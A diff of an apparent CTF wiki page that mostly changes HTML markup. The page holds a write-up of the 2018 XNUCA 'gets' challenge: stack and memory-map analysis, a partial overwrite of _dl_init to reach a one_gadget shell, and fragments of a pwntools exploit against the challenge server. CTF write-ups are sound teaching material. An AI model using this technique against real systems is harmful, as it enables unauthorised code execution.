+<div class="codehilite"><pre><span></span><code><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">hgfs</span><span class="o">/</span><span class="n">CTF</span><span class="o">/</span><span class="mi">2018</span><span class="o">/</span><span class="mi">1124</span><span class="n">XNUCA</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">gets</span><span class="o">/</span><span class="n">gets</span><span class="err">&#39;</span>
 
     <span class="nl">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
 
@@ -6110,7 +6110,7 @@ print e
     <span class="nl">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
 
     <span class="nl">PIE</span><span class="p">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>It is better that the program does not have a canary. Naturally, we can easily control the EIP of the program, but it is a problem to control where.</p>
 <h4 id="analysis">Analysis<a class="headerlink" href="#analysis" title="Permanent link">&para;</a></h4>
@@ -6135,8 +6135,8 @@ pwndbg&gt; stack 25</p>
 <p>10: 0080│ 0x7fffffffe418 —▸ 0x7fffffffe488 —▸ 0x7fffffffe704 ◂— 0x504d554a4f545541 (&#39;AUTOMOTIVE&#39;)
 11:0088│      0x7fffffffe420 —▸ 0x7ffff7ffe168 ◂— 0x0</p>
 <p>12:0090│      0x7fffffffe428 —▸ 0x7ffff7de77cb (_dl_init+139) ◂— jmp    0x7ffff7de77a0</p>
-<div class="codehilite"><pre><span></span>Where `__libc_start_main+240` is in libc and `_dl_init+139` is in ld
-</pre></div>
+<div class="codehilite"><pre><span></span><code>Where `__libc_start_main+240` is in libc and `_dl_init+139` is in ld
+</code></pre></div>
 
 <p>0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so</p>
 <p>0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</p>
@@ -6144,7 +6144,7 @@ pwndbg&gt; stack 25</p>
 <p>0x7ffff7dd1000 0x7ffff7dd3000 rw-p 2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
 0x7ffff7dd3000 0x7ffff7dd7000 rw-p 4000 0
 0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so</p>
-<div class="codehilite"><pre><span></span>A more natural idea is that we use partial overwrite to modify these two addresses to a location that gets the shell, which is naturally a Onegadget. So which one do we cover? ?
+<div class="codehilite"><pre><span></span><code>A more natural idea is that we use partial overwrite to modify these two addresses to a location that gets the shell, which is naturally a Onegadget. So which one do we cover? ?
 
 
 Let&amp;#39;s first analyze the base address `0x7ffff7a0d000` of `libc`. We generally want to cover the bytes, at least 1 nibble to be able to get jumped to onegadget. However, when the program reads it, it is read by `gets`, which means that `\x00` will definitely exist at the end of the string.
@@ -6160,10 +6160,10 @@ And the base address of ld? If we overwrite `_dl_init+139` on the stack, it is `
 
 
 For example, the current offset between the two is
-</pre></div>
+</code></pre></div>
 
 <p>0x7ffff7dd7000-0x7ffff7a0d000=0x3ca000</p>
-<div class="codehilite"><pre><span></span>Then if ld is loaded to `0x7ffff73ca000`, then the starting address of `libc` is obviously `0x7ffff7000000`.
+<div class="codehilite"><pre><span></span><code>Then if ld is loaded to `0x7ffff73ca000`, then the starting address of `libc` is obviously `0x7ffff7000000`.
 
 
 Therefore, we have a good reason to choose to overwrite the `_dl_init+139` stored on the stack. So what is it covered? Still don&amp;#39;t know. Because we don&amp;#39;t know what the library version of libc is,
@@ -6244,10 +6244,10 @@ def exp(ip, port):
 if __name__ == &quot;__main__&quot;:
 
     exp(&#39;106.75.4.189&#39;, 35273)
-</pre></div>
+</code></pre></div>
 
 <p>Finally, we found the following error. On the one hand, we can judge that this is definitely the 2.23 version of libc; on the other hand, we can finally locate the version of libc by <code>(cfree+0x4c)[0x7f57b6f9253c]</code>.</p>
-<div class="codehilite"><pre><span></span>======= Backtrace: =========
+<div class="codehilite"><pre><span></span><code>======= Backtrace: =========
 
 /lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f57b6f857e5]
 
@@ -6302,10 +6302,10 @@ if __name__ == &quot;__main__&quot;:
 7ffdec582000-7ffdec584000 r-xp 00000000 00:00 0                          [vdso]
 
 ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
-</pre></div>
+</code></pre></div>
 
 <p>After determining the version of libc, we can choose one_gadget, here I choose the first one, the lower address.</p>
-<div class="codehilite"><pre><span></span>➜  gets one_gadget /lib/x86_64-linux-gnu/libc.so.6
+<div class="codehilite"><pre><span></span><code>➜  gets one_gadget /lib/x86_64-linux-gnu/libc.so.6
 
 0x45216 execve<span class="o">(</span><span class="s2">&quot;/bin/sh&quot;</span>, rsp+0x30, environ<span class="o">)</span>
 
@@ -6336,10 +6336,10 @@ constraints:
 constraints:
 
   <span class="o">[</span>rsp+0x70<span class="o">]</span> <span class="o">==</span> NULL
-</pre></div>
+</code></pre></div>
 
 <p>Continue to blast with the following exp,</p>
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;split&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">]</span>
 
@@ -6412,12 +6412,12 @@ constraints:
 <span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
 
     <span class="n">exp</span><span class="p">(</span><span class="s1">&#39;106.75.4.189&#39;</span><span class="p">,</span> <span class="mi">35273</span><span class="p">)</span>
-</pre></div>
+</code></pre></div>
 
 <p>Finally get the shell.</p>
-<div class="codehilite"><pre><span></span><span class="err">$</span> <span class="n">ls</span>
+<div class="codehilite"><pre><span></span><code><span class="err">$</span> <span class="n">ls</span>
 <span class="n">exp</span><span class="o">.</span><span class="n">py</span>  <span class="n">gets</span>
-</pre></div>
+</code></pre></div>
 
 <h3 id="title_2">Title<a class="headerlink" href="#title_2" title="Permanent link">&para;</a></h3>
                 
@@ -6485,7 +6485,7 @@ constraints:
       
     </div>
     
-      <script src="../../../../assets/javascripts/application.970603a6.js"></script>
+      <script src="../../../../assets/javascripts/application.df00da5d.js"></script>
       
         
         
@@ -6500,7 +6500,7 @@ constraints:
           
         
       
-      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
+      <script>app.initialize({version:"1.1",url:{base:"../../../.."}})</script>
       
         <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
       
